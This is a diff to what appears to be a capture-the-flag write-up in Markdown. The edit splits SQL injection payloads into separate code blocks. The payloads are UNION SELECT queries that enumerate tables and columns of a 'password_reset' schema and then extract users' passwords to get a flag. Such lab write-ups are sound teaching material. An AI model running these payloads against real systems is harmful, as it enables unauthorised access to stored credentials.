@@ -321,7 +321,11 @@ ZSteg yields the flag
 and we will get the second flag.
 ```sql
 ' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema = 'password_reset' -- -
-' UNION SELECT NULL,NULL,NULL,column_name  FROM information_schema.columns WHERE table_schema = 'password_reset' -- -
+```
+```sql
+' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_schema = 'password_reset' -- -
+```
+```sql
 ' UNION SELECT NULL,NULL,NULL,password FROM password_reset.users-- -
 ```
 ![](./assets/web/error=300/flag2.png)
